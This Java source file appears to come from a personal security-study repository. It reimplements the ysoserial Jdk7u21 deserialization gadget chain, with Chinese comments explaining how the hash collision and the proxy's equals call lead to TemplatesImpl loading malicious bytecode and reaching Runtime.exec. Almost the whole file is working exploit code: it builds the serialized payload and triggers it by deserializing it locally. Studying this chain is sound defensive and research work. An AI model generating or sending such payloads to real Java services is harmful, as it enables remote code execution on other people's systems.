package com.xjjlearning.hack.java.ysoserial.payloads;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.xjjlearning.hack.java.basic.classloader.bytecodes.EvilTemplatesImpl;
import com.xjjlearning.hack.java.ysoserial.payloads.util.ClassUtil;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashSet;
import java.util.Map;

/**
 * created by xjj on 2023/2/9
 */

/**
 * HashSet.readObject() -> HashMap.put() -> (Proxy) key.equals(k) -> AnnotationInvocationHandler.equalsImpl() ->
 * invoke -> TemplatesImpl.newInstance() ...
 */

/*

Gadget chain that works against JRE 1.7u21 and earlier. Payload generation has
the same JRE version requirements.

See: https://gist.github.com/frohoff/24af7913611f8406eaf3

Call tree:

LinkedHashSet.readObject()
  LinkedHashSet.add()
    ...
      TemplatesImpl.hashCode() (X)
  LinkedHashSet.add()
    ...
      Proxy(Templates).hashCode() (X)
        AnnotationInvocationHandler.invoke() (X)
          AnnotationInvocationHandler.hashCodeImpl() (X)
            String.hashCode() (0)
            AnnotationInvocationHandler.memberValueHashCode() (X)
              TemplatesImpl.hashCode() (X)
      Proxy(Templates).equals()
        AnnotationInvocationHandler.invoke()
          AnnotationInvocationHandler.equalsImpl()
            Method.invoke()
              ...
                TemplatesImpl.getOutputProperties()
                  TemplatesImpl.newTransformer()
                    TemplatesImpl.getTransletInstance()
                      TemplatesImpl.defineTransletClasses()
                        ClassLoader.defineClass()
                        Class.newInstance()
                          ...
                            MaliciousClass.<clinit>()
                              ...
                                Runtime.exec()
 */
public class Jdk7u21 {
    // 这样运行
    // /Volumes/ONETSSD/jdk/jdk1.7.0_21.jdk/Contents/Home/bin/javac com/xjjlearning/hack/java/ysoserial/payloads/Jdk7u21.java
    // /Volumes/ONETSSD/jdk/jdk1.7.0_21.jdk/Contents/Home/bin/java com.xjjlearning.hack.java.ysoserial.payloads.Jdk7u21

    // 切记要看7u21的源码
    // 修复是增加了AnnotationInvocationHandler.type的类型 <? extends Annotation >
    public byte[] getPayload(String exp) throws Exception {

        // 从最下面往上推

        // TODO 找到Proxy和TemplatesImpl, hash相同 但是这两个东西不同
        // 其中TemplatesImpl的hash方法是native, 是随机. 于是拜托与Proxy
        // 由于Proxy调用hash方法会到AnnotationInvocationHandler#invoke 中hashCodeImpl()方法
        // 仔细分析后发现如果我们map中只有一个元素, 并且key的hash为0, 则最终result为value, 此时如果value为TemplatesImpl, 则完全相等
        // TODO 尝试使用HashSet -> readObject时候使用put -> put中用到equals方法
        // HashSet
        // if (p.hash == hash && ((k = p.key) == key || (key != null && key.equals(k))))
        // 这里 hash=hash(key), key是传参, p是链表头节点. 其中hash(key)调用key的hashcode()
        // 头节点的hash和key的hash相同, 但是头节点的key却不同于key 才能执行我们的equals方法
        // 意味着代理的hash和TemplatesImpl的hash相同
        // TODO 找到某个方法反序列化时对Proxy调用equals方法, 且传参为一个Object类型
        // TODO 找到在哪里调用invoke -> 使用代理
        // 下面的这个注释意味着代理类要和TemplatesImpl类进行equals比较, args[0]是唯一的参数是TemplatesImpl
        // AnnotationInvocationHandler.invoke(null, "equals", args[0]) -> equalsImpl(args[0]) -> 执行type类的所有方法
        // 代理的AnnotationInvocationHandler中的type应该是TemplatesImpl, 且代理类也是AnnotationInvocationHandler它本身
        // TODO type是Annotate的子类


        // TemplatesImpl
        class TFactory extends TransformerFactoryImpl {
        }

        byte[] code = ClassUtil.classAsBytes(EvilTemplatesImpl.class);
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "");
        setFieldValue(templates, "_bytecodes", new byte[][]{code});
        setFieldValue(templates, "_tfactory", new TFactory());

        // reflect
        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);

        // 设置一个无害的值
        HashMap<String, Object> memberValues = new HashMap<>();
        memberValues.put("f5a5a608", "foo");

        // Proxy
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Templates.class, memberValues);
        Templates proxy = (Templates) Proxy.newProxyInstance(Jdk7u21.class.getClassLoader(), new Class[]{Templates.class}, handler);

        HashSet<Object> set = new LinkedHashSet<>();
        // 这个顺序不能换, 因为需要执行proxy.equals(), 反序列化的时候也是这个顺序执行
        // 其实关键点在proxy的hashCode如何与templates的hashCode相同,
        // templates先加入到map中, proxy在加入的时候计算hashCode进入到invoke中hashCodeImpl(),
        // 因为这里key的hasCode是0所以值就是templates的hashCode了
        set.add(templates);
        set.add(proxy);

        // 替换值为恶意类
        memberValues.put("f5a5a608", templates);

        // 序列化
        final ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(out);
        oos.writeObject(set);
        return out.toByteArray();
    }

    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }
    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        }
        catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    private void hash(Object k) {
        int h = 0;
        h ^= k.hashCode();
        h ^= (h >>> 20) ^ (h >>> 12);
        int i = h ^ (h >>> 7) ^ (h >>> 4);
        System.out.println(i % 15); // table默认大小是15
    }

    private static void bruteHashCode() {
        // java-8
        // LongStream.range(0, 9999999999L).boxed().parallel()
        //         .filter(l -> Long.toHexString(l).hashCode() == 0)
        //         .map(Long::toHexString)
        //         .forEach(System.out::println);

        // f5a5a608
    }

    public static void main(String[] args) throws Exception {
        // bruteHashCode();
        byte[] payload = new Jdk7u21().getPayload("");

        // 反序列化
        final ByteArrayInputStream in = new ByteArrayInputStream(payload);
        ObjectInputStream objectInputStream = new ObjectInputStream(in);
        objectInputStream.readObject();
    }
}
